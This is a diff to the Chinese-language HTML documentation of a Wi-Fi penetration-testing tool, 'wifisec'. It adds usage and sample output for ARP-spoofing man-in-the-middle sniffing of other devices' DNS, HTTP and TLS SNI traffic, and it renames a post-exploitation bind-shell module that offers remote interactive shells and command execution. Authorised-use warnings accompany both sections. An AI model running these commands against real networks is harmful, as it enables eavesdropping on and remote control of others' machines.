@@ -73,8 +73,9 @@
           <a href="#cmd-brute">brute · 密码爆破</a>
           <a href="#cmd-clone">clone · 热点克隆</a>
           <a href="#cmd-devices">devices · 设备发现</a>
+          <a href="#cmd-sniff">sniff · 实时嗅探/MITM</a>
           <a href="#cmd-scan">scan_ports · 端口扫描</a>
-          <a href="#cmd-lateral">agent/shell · 横向移动</a>
+          <a href="#cmd-lateral">bind/shell · 横向移动</a>
           <a href="#cmd-packet">get_packet · 抓包导出</a>
           <a href="#cmd-pmkid">pmkid · PMKID 主动获取</a>
           <a href="#cmd-extract">extract · pcap 离线提取</a>
@@ -343,6 +344,31 @@ IP 地址        MAC 地址           主机名    角色
         <p>完整原理与跨平台实现见 <a href="feature/lan_analysis.md">lan_analysis.md §2</a>。</p>
       </section>
 
+      <section id="cmd-sniff">
+        <h2>sniff · 实时嗅探与 ARP 欺骗 MITM<a class="anchor" href="#cmd-sniff">#</a></h2>
+        <p>bettercap 风格的实时流量观测（Linux AF_PACKET、macOS BPF、Windows Npcap，需 root/管理员）：直读网卡帧并逐行标注 <strong>DNS 查询 / HTTP 请求 / TLS SNI</strong>，40 行/秒限速折叠显示，退出时输出协议分布统计。<code>--spoof</code> 叠加 ARP 欺骗 MITM（对应 bettercap 的 net.spoof）：对网关与目标双向 1s 毒化 + who-has 即时应答，同时开启 IP 转发并压制 ICMP redirect（Linux procfs / macOS sysctl），<strong>退出时按启动前备份以真实 MAC 重发 5 轮恢复帧</strong>完整还原。</p>
+        <pre><code class="lang-bash">sudo wifisec sniff                 <span class="cmt"># 被动嗅探：本机流量 + ARP/DHCP/mDNS 广播</span>
+sudo wifisec sniff --spoof --targets 192.168.1.46,192.168.1.47   <span class="cmt"># ARP 欺骗 MITM，观测目标流量</span>
+sudo wifisec sniff --iface en0 --spoof   <span class="cmt"># 显式指定网卡（多网卡/VPN 场景）</span></code></pre>
+        <pre><code class="lang-log">[信息] 实时嗅探接口 en0 · Ctrl-C 结束
+[信息] ARP 欺骗 MITM：网关 192.168.1.1 ↔ 目标 1 台（192.168.1.46）
+[信息] 目标流量将途经本机，DNS 查询 / HTTP 请求 / TLS SNI 会实时标注
+[信息] #1234   192.168.1.46 → 192.168.1.1  UDP  dns 查询 api.example.com (78 B)
+[信息] #1235   192.168.1.46 → 93.184.216.34  TCP  GET / HTTP/1.1 · Host: example.com (462 B)
+[信息] #1236   192.168.1.46 → 104.16.132.229  TCP  SNI sni.example.com (517 B)
+[信息] 嗅探结束：4821 帧 · 3.6 MB · 时长 2m14s
+协议分布：ARP 2210 · UDP 1602 · TCP 1009</code></pre>
+        <div class="alert info">
+          <span class="alert-icon">ⓘ</span>
+          <div>WPA2 加密下被动模式只能看到本机流量与广播帧（ARP/DHCP/mDNS）——<strong>这是加密 WiFi 的物理边界，不是功能缺陷</strong>；要观测他人单播流量需要 ARP 欺骗把流量引到本机。目标未指定时自动对网段内在线设备规划毒化列表（上限 32 台），网关 MAC 解析不到会拒绝启动并提示先用 <code>devices</code> 预热。</div>
+        </div>
+        <div class="alert warning">
+          <span class="alert-icon">⚠</span>
+          <div><code>--spoof</code> 会实时截获目标通信内容，未经授权使用即构成实时窃听，触犯《刑法》第二百八十五条第二款。<strong>仅限自有网络或已获书面授权的测试环境</strong>。正常 Ctrl-C 会完整还原；<code>kill -9</code> 会跳过恢复帧，目标将断网直至 ARP 缓存老化（通常 1-5 分钟）。Windows 因 IPEnableRouter 无法即开即还而明确拒绝欺骗入口，被动嗅探不受影响。</div>
+        </div>
+        <p>协议原理、恢复矩阵、生命周期与排错表见 <a href="feature/wifi_sniff.md">wifi_sniff.md</a>。</p>
+      </section>
+
       <section id="cmd-scan">
         <h2>scan_ports · 端口扫描<a class="anchor" href="#cmd-scan">#</a></h2>
         <p>对标 <code>nmap -sT</code> 的 TCP connect 扫描：握手由内核完成，<strong>四平台免 root</strong>，同时给出精确三态——握上是 <code>open</code>、收到 RST 是 <code>closed</code>、超时/不可达是 <code>filtered</code>。200 并发、单端口 1.5s；open 端口再做被动 banner 抓取（HTTP 族端口补发 <code>HEAD / HTTP/1.0</code>）。</p>
@@ -365,14 +391,14 @@ wifisec scan_ports 192.168.1.46 22,80,8000-8100  <span class="cmt"># 列表与�
       </section>
 
       <section id="cmd-lateral">
-        <h2>agent / shell · 横向移动<a class="anchor" href="#cmd-lateral">#</a></h2>
-        <p>后渗透横向扩展通道：被控端 <code>wifisec agent</code> 监听 TCP（默认 9485），控制端 <code>wifisec &lt;ip&gt; bash</code> 拿交互 shell，<code>wifisec &lt;ip&gt; &lt;命令&gt;</code> 单命令一步执行（IP 开头自动路由）。认证走 HMAC-SHA256 挑战应答——令牌不落网、抓包重放无效，空令牌自动生成随机令牌并打印。</p>
-        <pre><code class="lang-bash">wifisec agent --token lab2026                 <span class="cmt"># 被控端：监听等待接入</span>
+        <h2>bind / shell · 横向移动<a class="anchor" href="#cmd-lateral">#</a></h2>
+        <p>后渗透横向扩展通道：被控端 <code>wifisec bind</code> 监听 TCP（默认 9485），控制端 <code>wifisec &lt;ip&gt; bash</code> 拿交互 shell，<code>wifisec &lt;ip&gt; &lt;命令&gt;</code> 单命令一步执行（IP 开头自动路由）。认证走 HMAC-SHA256 挑战应答——令牌不落网、抓包重放无效，空令牌自动生成随机令牌并打印。</p>
+        <pre><code class="lang-bash">wifisec bind --token lab2026                  <span class="cmt"># 被控端：bind shell 监听等待接入</span>
 wifisec 192.168.1.123 bash --token lab2026    <span class="cmt"># 控制端：交互 shell</span>
 wifisec 192.168.1.123 whoami --token lab2026  <span class="cmt"># 单命令一步执行</span></code></pre>
         <div class="alert warning">
           <span class="alert-icon">⚠</span>
-          <div>仅限自有网络或已获书面授权的环境使用。agent 需先在目标机上落地启动——本模块是「已拿下 → 扩展」通道，不含投递手段；交互为行级语义（非 PTY），vim/top 等全屏程序不支持属刻意取舍。</div>
+          <div>仅限自有网络或已获书面授权的环境使用。bind 需先在目标机上落地启动——本模块是「已拿下 → 扩展」通道，不含投递手段；交互为行级语义（非 PTY），vim/top 等全屏程序不支持属刻意取舍。</div>
         </div>
         <p>协议时序、超时击杀（退出码 124）、令牌传递与排错见 <a href="feature/lateral_movement.md">lateral_movement.md</a>。</p>
       </section>
